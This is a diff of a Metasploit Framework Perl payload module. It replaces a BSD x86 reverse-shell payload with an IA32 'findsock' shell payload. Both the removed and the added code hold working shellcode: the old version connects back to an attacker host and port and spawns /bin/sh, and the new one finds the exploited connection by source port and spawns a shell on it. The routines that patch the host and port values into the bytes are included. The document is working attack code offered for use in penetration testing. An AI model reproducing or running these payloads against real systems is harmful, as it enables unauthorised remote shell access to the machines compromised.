@@ -7,20 +7,24 @@
 # version of the Framework can always be obtained from metasploit.com.
 ##
 
-package Msf::Payload::bsdx86_reverse;
+package Msf::Payload::bsd_ia32_findsock;
 use strict;
-use base 'Msf::PayloadComponent::ReverseConnection';
+use base 'Msf::PayloadComponent::FindConnection';
 
 my $info =
 {
-  'Name'         => 'BSD Reverse Shell',
+  'Name'         => 'BSD IA32 Srcport Findsock Shell',
   'Version'      => '$Revision$',
-  'Description'  => 'Connect back to attacker and spawn a shell',
-  'Authors'      => [ 'root[at]marcetam.net [Unknown License]', ],
+  'Description'  => 'Spawn a shell on the established connection',
+  'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>', ],
   'Arch'         => [ 'x86' ],
   'Priv'         => 0,
   'OS'           => [ 'bsd' ],
   'Size'         => '',
+  'UserOpts'     =>
+    {
+      'CPORT' => [1, 'PORT', 'Local port used by exploit'],
+    }
 };
 
 sub new {
@@ -35,36 +39,31 @@ sub new {
 
 sub Build {
   my $self = shift;
-  return($self->Generate($self->GetVar('LHOST'), $self->GetVar('LPORT')));
+  return($self->Generate($self->GetVar('CPORT')));
 }
 
 sub Generate {
   my $self = shift;
-  my $host = shift;
   my $port = shift;
-  my $off_host = 10;
-  my $off_port = 18;
-  
-  my $shellcode = # bsd reverse connect by root[at]marcetam.net
-  "\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x68\xaa\xbb\xcc\xdd\xcd\x80".
-  "\x66\x68\xbb\xaa\x66\x52\x89\xe6\x6a\x10\x56\x50\x50\x6a\x62\x58".
-  "\xcd\x80\x5b\xb0\x5a\x52\x53\x52\x4a\xcd\x80\x7d\xf6\x68\x6e\x2f".
-  "\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x54\x53\x53\xb0\x3b\xcd".
-  "\x80";
-
-  my $host_bin = gethostbyname($host);
+  my $off_port = 24;
   my $port_bin = pack('n', $port);
 
-  substr($shellcode, $off_host, 4, $host_bin);
+  my $shellcode = # bsd findsock code by vlad902 
+  "\x31\xff\x57\x89\xe5\x47\x89\xec\x6a\x10\x54\x55".
+  "\x57\x6a\x1f\x58\x6a\x02\xcd\x80\x66\x81\x7d\x02".
+  "\x11\x5c\x75\xe9\x59\x51\x57\x6a\x5a\x58\x51\xcd".
+  "\x80\x49\x79\xf5\x68\x2f\x2f\x73\x68\x68\x2f\x62".
+  "\x69\x6e\x89\xe3\x50\x54\x53\xb0\x3b\x50\xcd\x80";
+
+
   substr($shellcode, $off_port, 2, $port_bin);
-  
-  # $shellcode = "\x81\xc4\x00\xfe\xff\xff" . $shellcode;
+
   return($shellcode);
 }
 
 sub _GenSize {
   my $self = shift;
-  my $bin = $self->Generate('127.0.0.1', 4444);
+  my $bin = $self->Generate('4444');
   return(length($bin));
 }
 
